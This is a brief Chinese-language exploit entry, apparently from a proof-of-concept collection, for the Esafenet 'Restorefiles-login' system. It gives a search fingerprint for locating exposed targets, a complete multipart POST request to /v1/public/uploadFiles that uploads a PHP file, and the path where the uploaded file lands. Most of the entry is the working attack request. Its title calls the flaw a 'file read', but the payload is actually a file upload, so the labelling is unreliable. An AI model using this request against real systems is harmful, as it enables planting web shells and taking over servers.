# 亿赛通Restorefiles-login文件读取

- **系统**：亿赛通Restorefiles-login　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`body="campuswit"`
- **请求**：`POST /v1/public/uploadFiles HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Content-Length: 412`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="keep_filename"
1
--00content0boundary00
Content-Disposition: form-data; name="check_file"
1
--00content0boundary00
Content-Disposition: form-data; name="campuswitHash"
campuswit_hash_success
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: text/php
1234
--00content0boundary00--
上传位置：/uploads/attachments/2024/03/26/1.php
```